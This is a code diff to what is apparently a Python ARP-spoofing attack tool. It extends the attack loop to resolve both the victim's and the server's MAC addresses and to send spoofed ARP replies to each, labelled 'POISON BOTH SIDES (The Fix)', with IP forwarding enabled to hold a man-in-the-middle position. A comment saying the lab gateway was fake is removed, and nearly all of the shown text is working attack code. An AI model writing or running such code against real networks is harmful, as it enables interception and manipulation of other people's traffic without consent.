@@ -84,25 +84,30 @@ def run_attack_loop(target_ip, gateway_ip):
     log_msg(f"🚀 Attack launched against {target_ip} via {STATUS['interface']}")
     set_ip_forwarding(1)
     
+    # ... inside run_attack_loop ...
     try:
         while not STOP_EVENT.is_set():
+            # 1. Get MAC addresses for BOTH targets
             target_mac = get_mac(target_ip)
-            
-            if target_mac:
-                # Log success and update MAC only on first resolution
+            gateway_mac = get_mac(gateway_ip) # This is the Server's MAC
+
+            if target_mac and gateway_mac:
+                # Log success only on first resolution
                 if STATUS["target_mac"] == "N/A":
                     STATUS["target_mac"] = target_mac
-                    log_msg(f"✅ SUCCESS: Resolved Target MAC: {target_mac}")
+                    log_msg(f"✅ Targets Resolved: Victim={target_mac} | Server={gateway_mac}")
                 
-                # --- Send Spoof Packets ---
+                # --- POISON BOTH SIDES (The Fix) ---
+                
+                # 1. Tell Victim that WE are the Server
                 spoof(target_ip, gateway_ip, target_mac)
+
+                # 2. Tell Server that WE are the Victim
+                spoof(gateway_ip, target_ip, gateway_mac)
                 
-                # We skip spoofing the gateway in this lab as it's fake.
-                
-                STATUS["packets"] += 1
+                STATUS["packets"] += 2
             else:
-                # Target is offline or IP address is wrong
-                log_msg(f"🔴 WARNING: Target {target_ip} is unreachable (MAC resolution failed).")
+                log_msg(f"⚠️ Retrying... Could not find both MACs. (Victim: {target_mac}, Server: {gateway_mac})")
                 
             time.sleep(2)
 
